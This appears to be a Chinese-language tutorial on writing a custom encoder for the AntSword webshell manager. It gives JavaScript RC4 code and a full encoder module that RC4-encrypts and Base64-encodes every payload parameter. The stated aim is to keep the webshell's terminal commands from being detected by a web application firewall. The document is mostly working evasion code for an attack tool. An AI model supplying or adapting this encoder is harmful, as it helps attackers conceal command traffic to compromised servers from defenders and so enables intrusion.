编码器

在蚁剑的编码管理中，可以新建编码器，根据自己的需求修改

编码器的代码主要是基于js，所以要去找一个用js实现的rc4加密，代码如下：

function rc4(data,key)
{
    let pwd = key || 'COwC2GiRIaouOuiQSxamm8NO8U1s1jNNWuSwteOCnM3C6gHa';
    let cipher      = '';
    key       = [];
    let box       = [];
    let pwd_length  = pwd.length;
    let data_length = data.length;
    for (var i = 0; i < 256; i++) {
        key[i] = pwd[i % pwd_length].charCodeAt();
        box[i] = i;
    }
    for (var j = i = 0; i < 256; i++) {
        j = (j + box[i] + key[i]) % 256;
        var tmp = box[i];
        box[i] = box[j];
        box[j] = tmp;
    }
    for (var a = j = i = 0; i < data_length; i++) {
        a       = (a + 1) % 256;
        j       = (j + box[a]) % 256;
        tmp     = box[a];
        box[a] = box[j];
        box[j] = tmp;
        let k       = box[((box[a] + box[j]) % 256)];
        cipher += String.fromCharCode(data[i].charCodeAt() ^ k);
    }
    return cipher;
}

在虚拟终端执行命令的时候，执行的命令只会经过一层Base64编码，也可能被WAF检测出来

所以需要配置编码器把所有参数的值都用RC4加密，代码如下：

/**
 * php::rc4编码器
 * Create at: 2020/01/09 10:13:27
 */

'use strict';

/*
* @param  {String} pwd   连接密码
* @param  {Array}  data  编码器处理前的 payload 数组
* @return {Array}  data  编码器处理后的 payload 数组
*/
function rc4(data,key)
{
    let pwd = key || 'COwC2GiRIaouOuiQSxamm8NO8U1s1jNNWuSwteOCnM3C6gHa';
    let cipher      = '';
    key       = [];
    let box       = [];
    let pwd_length  = pwd.length;
    let data_length = data.length;
    for (var i = 0; i < 256; i++) {
        key[i] = pwd[i % pwd_length].charCodeAt();
        box[i] = i;
    }
    for (var j = i = 0; i < 256; i++) {
        j = (j + box[i] + key[i]) % 256;
        var tmp = box[i];
        box[i] = box[j];
        box[j] = tmp;
    }
    for (var a = j = i = 0; i < data_length; i++) {
        a       = (a + 1) % 256;
        j       = (j + box[a]) % 256;
        tmp     = box[a];
        box[a] = box[j];
        box[j] = tmp;
        let k       = box[((box[a] + box[j]) % 256)];
        cipher += String.fromCharCode(data[i].charCodeAt() ^ k);
    }
    return cipher;
}
module.exports = (pwd, data, ext={}) => {
  let ret = {};
    for (let _ in data) {
      if (_ === '_') { continue };
      ret[_] = btoa(rc4(Buffer.from(data[_]).toString(),pwd));
  }
  let rc4_data = rc4(Buffer.from(data['_']).toString(),pwd);
  ret[pwd] = btoa(rc4_data);
  delete data['_'];
  return ret;
}
